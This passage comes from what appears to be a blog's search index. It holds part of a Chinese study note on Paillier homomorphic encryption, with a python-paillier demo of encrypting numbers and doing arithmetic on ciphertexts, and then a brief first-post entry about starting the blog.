n^{2}=L(g^{\lambda m_1 m_2} \cdot r_{1}^{\lambda n m2})\cdot \mu \bmod n^{2}=\lambda(m_1m_2)\cdot \mu=m_1m_2\end{gather*}</script><h3 id="2-6-Paillier实战"><a href="#2-6-Paillier实战" class="headerlink" title="2.6 Paillier实战"></a>2.6 Paillier实战</h3><p>这里主要是使用python-paillier开源库进行模拟, 地址: <a href="https://github.com/data61/python-paillier">python-paillier</a></p><h4 id="2-6-1-安装python-paillier库"><a href="#2-6-1-安装python-paillier库" class="headerlink" title="2.6.1 安装python-paillier库"></a>2.6.1 安装python-paillier库</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install phe</span><br></pre></td></tr></table></figure><h4 id="2-6-2-基本用法"><a href="#2-6-2-基本用法" class="headerlink" title="2.6.2 基本用法"></a>2.6.2 基本用法</h4><p>测试代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> phe <span class="keyword">import</span>  paillier</span><br><span class="line"><span class="keyword">from</span> phe.command_line <span class="keyword">import</span> encrypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成私钥和公钥</span></span><br><span class="line">public_key,private_key=paillier.generate_paillier_keypair()</span><br><span class="line"></span><br><span class="line">secret_number_list=[<span class="number">3.141592653</span>,<span class="number">50000</span>,-<span class="number">4.6e-12</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line">encrypted=[public_key.encrypt(x) <span class="keyword">for</span> x <span class="keyword">in</span> secret_number_list]</span><br><span class="line">a,b,c=encrypted <span class="comment">#a,b,c为分别对应的密文</span></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line">decrypted=[private_key.decrypt(x) <span class="keyword">for</span> x <span class="keyword">in</span> encrypted]</span><br><span class="line"><span class="comment">#print(decrypted)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始的明文数据是:&quot;</span>,secret_number_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加密后的密文为:\n<span class="subst">&#123;a.ciphertext()&#125;</span>\n<span class="subst">&#123;b.ciphertext()&#125;</span>\n<span class="subst">&#123;c.ciphertext()&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接在密文上进行操作</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;直接在密文上进行加法+2操作:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> encrypted:</span><br><span class="line">    <span class="built_in">print</span>(private_key.decrypt(x+<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;直接在密文上进行乘法*2操作:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> encrypted:</span><br><span class="line">    <span class="built_in">print</span>(private_key.decrypt(x*<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试加法同态和乘法同态</span></span><br><span class="line"><span class="comment">#同态加密就是直接在密文上进行计算操作，且得到的结果解密后与原始数据进行相同计算操作得到的结果一致</span></span><br><span class="line"><span class="keyword">if</span>(private_key.decrypt(a+b)==secret_number_list[<span class="number">0</span>]+secret_number_list[<span class="number">1</span>]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加法同态得到结果一致&quot;</span>)</span><br><span class="line"><span class="comment">#不支持密文*密文操作</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">原始的明文数据是: [<span class="number">3.141592653</span>, <span class="number">50000</span>, -<span class="number">4.6e-12</span>]</span><br><span class="line">加密后的密文为:</span><br><span class="line"><span class="number">6135642717476440288407940386973406424179597264131770247248102742010468720333833225649509063748135593417249291664647230118171880275385427768661278194179811149980484107875079167966037640330927833409551348424009960068423059960154838566322299195353397421437872915804745060533261832278429271204744456789961203266052848010919722959341417482024982142102529926890593903314112664543957037887158716744571871264210589446764218013112820393615950957086607861565308016365237196306966010745077365412367839307532518170100179456773127734147346604235844813044265233075016539928080838485143223995802554571383461035263995403783064611306317555256285988840969029742977968144872682458936420127227230476819291303124001473587923460769397658268024400886555390258660618373303414439455211672717812666697638035222117443908650283514435608463625378214050364068755129824410490701664831571275306964067204071005470027118378689651829148880539573822487153481061470277580577600175521806242106858972388994227724395869506642559032895967293793343876890145360440625385914915118257143910111826237187307820978010483113189911368282892421162883412638039297069837343163912708762909713756179690176457109522301379897744926757752311597922050024148761665375103555182414838633525445609661410252899063498510115771914132805409567484187921658398974418382890964839125981586348726045243333495314428481282190467375523460497432128692207506441289627508380795234964885871582085230280132691345948398132555966200855244255648321920131951439696611676124269404466976180294962281445458807943012918012404089846508333274591599727485060331623606174040694791503822698059396853307777347504952896153744082791225468534691438132909249689191233089350038971418419335809120903150499784609969567112545363360198125593245665624566815113695011787411604336491361460042949730556105104860435984770859626375877623884062067189129950180</span></span><br><span class="line"><span class="number">887005022522579447848205920806710360909905718591189281931160414910549152523241076199319838555395628981196313249650442055291336440727334264609927402686839092259539091806267508731596185601945267340158283814725867055142350838873977884437455988256793834938544399110653821598343100566315517131009630463758427674741632987854143941273277406130544928639596805847903901872619306943467440651124331358414655009038819086417786999141500468891038595923333543228285676618955025241632566941244513073724178810891249994862641467055938701921034463570669407425499466966614995736403620307164619068695077483394674655491668059501289997984748471727455510282488950427021066786988802714724934069315750072430493670702292961959351861990350908010035027235436142496519572061639045766037724040168016634665220315171534601878486078146141036209112753667794836310776413372090360499415335386249693576221646721388111593525013348622038294276700011838623658512860535722955926153513295870279541110526588704213026487898973565504365143192106523282754721704597946528197131102310494268027064892280655944273426061769686315420030387006946764328759186228215890918819632830165788070069840471094460082378686670731840685542630431810339310104136600202543862750484297465773842549039973676782156504118923176398442761632823191417959286488765026652099790923996485356416436227426568760028842792661257638755706242281259745653462582679989619677046541678862053832610084198972899069941746702241883580322136635072016411615020395158346898642764436395616200752755431700573294891784344134726676362530310448752821280044944859856437724872997808669615929491594710408026028211363505886848089977144357763600878248532335971494244646237482683583560221949882212204132473662202602957427603105175985896686514125329220361852710593844658262087288692429013917912788736677741102128337897654661912656981245063891143413271880198</span></span><br><span class="line"><span class="number">4037834938559113619998421172126988631404057769776394076009642746492930549963427577763531697013121860978579303640942002203573909988758058637783285612984589563341275746505104066786459644139296154989247555286766332632956277526381221905394405047878853819672351319589245550064992212014659527107405496539715766902603145770139269460891688467495430592590109629243358486012139563568091165337492106001695221963062782387101039883902482021844332025477744754094691117955989515071972713229143707017639271181111758343051392150486122301639851781824768663450374570863934194319372897693598980087567991904726792217639572484515329384708058640520702920356676765045039269097405323207102964402256931020225226574796100098393728445500536230857645017388597635343797974623015219437794113364384121571373446465230310133314591493338351772191359455173800995719951869852495461808153822475333168253753478440159263287430264597640183391855918546893101611046809590097041491211129504239765147502244593473087877341414822274679881047552475492207704048970711469190320750078378942213065783986762161609262844273973580105444131146141091913501127480420309827038824652233093197954777717602547166876425118434350400560848462197198332051713282037170254544403656446710150866640615337026352654671865687758120421675024795483426165854979402460251083766743824236705890427680912489990719801474531552377098780868655341869341506050884129178193807619968296450530661258034692933951102120282490300045565528259615887430240284882048366613762768924291240487713709102291659985373901417584488360396271364473451620447795773907199476071956478187939530636081184148667494643604921345971538250781793067325928447552265330527703761935250265847640143558212289976423426290977866451255574548301724673646029516803256160958927650871855915629377334996810457919664025499656727666953298009410893931657899407241861948032341341509</span></span><br><span class="line"></span><br><span class="line">直接在密文上进行加法+<span class="number">2</span>操作:</span><br><span class="line"><span class="number">5.141592653</span></span><br><span class="line"><span class="number">50002</span></span><br><span class="line"><span class="number">1.9999999999954</span></span><br><span class="line">直接在密文上进行乘法*<span class="number">2</span>操作:</span><br><span class="line"><span class="number">6.283185306</span></span><br><span class="line"><span class="number">100000</span></span><br><span class="line">-<span class="number">9.2e-12</span></span><br><span class="line">加法同态得到结果一致</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2025/04/03/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2025/04/03/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>搞博客主要是每次搜集资料非常麻烦，所以我就想着自己搭建一个博客然后来记录一些知识点，同时我也会在我的博客上分享我的日常和生活。</p>]]></content>
      
      
      <categories>
          
          <category> 日常日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
